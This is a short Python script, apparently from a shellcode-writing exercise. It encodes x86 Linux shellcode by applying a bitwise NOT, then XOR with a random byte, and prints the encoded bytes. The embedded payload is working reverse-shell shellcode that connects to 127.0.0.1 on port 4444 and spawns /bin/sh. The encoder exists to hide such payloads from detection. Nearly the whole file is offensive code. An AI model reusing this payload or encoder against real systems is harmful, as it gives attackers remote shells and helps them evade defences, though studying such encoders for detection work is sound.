#!/usr/bin/python3
# NX-Encoder.py
# Author: Michael Norris

import random


def n_encode(bytes_obj):
    return [(~byte & 0xff) for byte in bytes_obj]


def x_encode(bytes_obj):
    return [(byte ^ xor_byte) for byte in bytes_obj]


def find_xor_byte(bytes_obj):
    byte_range = [i for i in range(256)]
    xor_list = [byte for byte in byte_range if byte not in bytes_obj]
    return random.choice(xor_list)


def format_shellcode(bytes_obj, hex_format=True):
    encoded = ''
    if hex_format:
        for byte in bytes_obj:
            encoded += '0x'
            encoded += '%02x,' % byte
        encoded = encoded[:-1]
    else:
        for byte in bytes_obj:
            encoded += '\\x'
            encoded += '%02x' % byte
    return encoded


def decode_shellcode(bytes_obj):
    return n_encode(x_encode(bytes_obj))


shellcode = b'' 
shellcode += b'\x31\xdb\xf7\xe3\x52\x6a\x01\x6a'
shellcode += b'\x02\x89\xe1\xfe\xc3\xb0\x66\xcd'
shellcode += b'\x80\x89\xc3\xbf\xff\xff\xff\xff'
shellcode += b'\xb9\x80\xff\xff\xfe\x31\xf9\x51'
shellcode += b'\x66\x68\x11\x5c\x66\x6a\x02\x89'
shellcode += b'\xe1\x6a\x10\x51\x53\x89\xe1\xb0'
shellcode += b'\x66\xcd\x80\x89\xd1\xb0\x3f\xcd'
shellcode += b'\x80\xfe\xc1\xb0\x3f\xcd\x80\xfe'
shellcode += b'\xc1\xb0\x3f\xcd\x80\x52\x68\x2f'
shellcode += b'\x2f\x73\x68\x68\x2f\x62\x69\x6e'
shellcode += b'\x89\xd1\x89\xe3\xb0\x0b\xcd\x80'

n_encoded = n_encode(shellcode)

xor_byte = find_xor_byte(n_encoded)
nx_encoded = x_encode(n_encoded)

formatted_shellcode = format_shellcode(nx_encoded)

print('Length: %d' % len(nx_encoded))
print('XOR Byte: ' + hex(xor_byte))
print(formatted_shellcode)
